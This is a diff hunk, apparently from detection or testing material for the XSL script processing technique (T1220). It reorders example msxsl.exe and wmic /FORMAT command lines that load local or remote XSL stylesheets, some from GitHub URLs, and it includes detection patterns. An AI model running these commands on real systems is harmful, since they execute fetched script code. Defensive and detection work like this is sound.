@@ -43,21 +43,13 @@ Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)
 
 ```
 C:\Windows\Temp\msxsl.exe PathToAtomicsFolder\T1220\src\msxslxmlfile.xml #{xslfile}
-
-C:\Windows\Temp\msxsl.exe #{xmlfile} PathToAtomicsFolder\T1220\src\msxslscript.xsl
-
-C:\Windows\Temp\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml #{xslfile}
-
-C:\Windows\Temp\msxsl.exe #{xmlfile} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
-
-wmic process list /FORMAT:"#{local_xsl_file}"
-
-wmic #{wmic_command} /FORMAT:"PathToAtomicsFolder\T1220\src\wmicscript.xsl"
-
 wmic #{wmic_command} /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"
-
 wmic process list /FORMAT:"#{remote_xsl_file}"
-
+wmic process list /FORMAT:"#{local_xsl_file}"
+C:\Windows\Temp\msxsl.exe #{xmlfile} https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+C:\Windows\Temp\msxsl.exe #{xmlfile} PathToAtomicsFolder\T1220\src\msxslscript.xsl
+wmic #{wmic_command} /FORMAT:"PathToAtomicsFolder\T1220\src\wmicscript.xsl"
+C:\Windows\Temp\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml #{xslfile}
 msxsl.exe
 wmic.exeprocess|list|/FORMAT|.xsl
 wmic.exeos|get|/FORMAT|.xsl
